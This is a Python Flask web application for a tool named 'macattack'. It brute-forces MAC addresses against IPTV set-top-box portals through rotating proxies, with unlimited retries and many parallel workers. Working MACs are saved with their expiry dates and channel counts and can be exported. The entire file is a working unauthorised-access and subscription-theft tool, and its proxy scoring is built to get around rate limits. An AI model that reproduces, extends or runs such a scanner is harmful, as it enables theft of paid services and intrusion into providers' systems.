import os, json, logging, threading, asyncio, hashlib, secrets, time
from datetime import datetime
from functools import wraps
from collections import deque
from flask import Flask, render_template, request, jsonify, Response, session
import stb_async

# --- CONFIG ---
CONFIG_FILE = os.getenv("CONFIG", "./data/macattack.json")
os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(32)

SCAN_STATE = {"running": False, "total": 0, "checked": 0, "hits": 0, "errors": 0, "active_proxies": 0}

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f: return json.load(f)
    return {"portals": [], "proxies": [], "found_macs": [], "settings": {"auth_enabled": False, "unlimited_retries": True}}

def save_config(conf):
    with open(CONFIG_FILE, 'w') as f: json.dump(conf, f, indent=4)

# --- AUTH ---
def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        conf = load_config()
        if conf.get("settings", {}).get("auth_enabled") and not session.get("logged_in"):
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated

# --- SCANNER CORE ---
class AsyncScanner:
    def __init__(self, macs, portal, proxies, threads, skip_unl, unl_retries):
        self.macs = macs
        self.portal = portal
        self.proxies = deque([{'url': p, 'score': 10} for p in proxies])
        self.threads = threads
        self.skip_unl = skip_unl
        self.unl_retries = unl_retries
        self.queue = asyncio.Queue()
        self.retry_counts = {}
        self.client = stb_async.AsyncStbClient()

    async def worker(self):
        while SCAN_STATE['running']:
            try: item = await asyncio.wait_for(self.queue.get(), timeout=1.0)
            except: continue

            if not self.proxies: break
            p_obj = self.proxies.popleft()
            
            try:
                success, data = await self.client.quick_scan(self.portal, item['mac'], p_obj['url'])
                SCAN_STATE['checked'] += 1
                if success:
                    p_obj['score'] = min(p_obj['score'] + 1, 20)
                    self.proxies.append(p_obj)
                    if not ('unlimited' in str(data['expiry']).lower() and self.skip_unl):
                        data = await self.client.fetch_details(data, p_obj['url'])
                    
                    data['found_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    SCAN_STATE['hits'] += 1
                    conf = load_config(); conf['found_macs'].append(data); save_config(conf)
                else:
                    self.proxies.append(p_obj)
            except:
                p_obj['score'] -= 1
                if p_obj['score'] > 0: self.proxies.append(p_obj)
                
                # UNLIMIT RETRY: MAC zurück in die Queue
                retries = self.retry_counts.get(item['mac'], 0)
                if self.unl_retries or retries < 10:
                    self.retry_counts[item['mac']] = retries + 1
                    await self.queue.put(item)
                else: SCAN_STATE['errors'] += 1
            finally:
                self.queue.task_done()
                SCAN_STATE['active_proxies'] = len(self.proxies)

    async def run(self):
        for m in self.macs: await self.queue.put({'mac': m})
        workers = [asyncio.create_task(self.worker()) for _ in range(self.threads)]
        await self.queue.join()
        await self.client.close()
        SCAN_STATE['running'] = False

# --- ROUTES ---
@app.route('/')
def index(): return render_template('index.html', version="3.1-Async")

@app.route('/api/attack/start', methods=['POST'])
@requires_auth
def api_start():
    data = request.json
    conf = load_config()
    SCAN_STATE.update({"running": True, "total": len(data['macs']), "checked": 0, "hits": 0, "errors": 0})
    
    def run_loop():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        scanner = AsyncScanner(data['macs'], data['portal'], data['proxies'], 
                              int(data.get('threads', 100)), data.get('skip_unlimited', False),
                              conf['settings'].get('unlimited_retries', True))
        loop.run_until_complete(scanner.run())
    
    threading.Thread(target=run_loop, daemon=True).start()
    return jsonify({"success": True})

@app.route('/api/attack/status')
def api_status(): return jsonify(SCAN_STATE)

@app.route('/api/attack/stop', methods=['POST'])
def api_stop():
    SCAN_STATE['running'] = False
    return jsonify({"success": True})

@app.route('/api/found', methods=['GET', 'DELETE'])
@requires_auth
def api_found():
    conf = load_config()
    if request.method == 'DELETE':
        conf['found_macs'] = []
        save_config(conf)
        return jsonify({"success": True})
    return jsonify(conf.get('found_macs', []))

@app.route('/api/found/export')
@requires_auth
def api_export():
    fmt = request.args.get("format", "txt")
    found = load_config().get("found_macs", [])
    if fmt == "json":
        return Response(json.dumps(found, indent=2), mimetype="application/json")
    
    lines = [f"Portal: {m['portal']} | MAC: {m['mac']} | Expiry: {m['expiry']} | Ch: {m.get('channels', 0)}" for m in found]
    return Response("\n".join(lines), mimetype="text/plain")

@app.route('/api/settings', methods=['GET', 'POST'])
@requires_auth
def api_settings():
    conf = load_config()
    if request.method == 'POST':
        conf['settings'].update(request.json); save_config(conf)
        return jsonify({"success": True})
    return jsonify(conf.get('settings', {}))

@app.route('/api/proxies', methods=['GET', 'POST', 'DELETE'])
@requires_auth
def api_proxies():
    conf = load_config()
    if request.method == 'POST':
        new_p = request.json.get('proxies', [])
        conf['proxies'] = list(set(conf.get('proxies', []) + new_p)); save_config(conf)
    elif request.method == 'DELETE':
        conf['proxies'] = []; save_config(conf)
    return jsonify(conf.get('proxies', []))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5003)
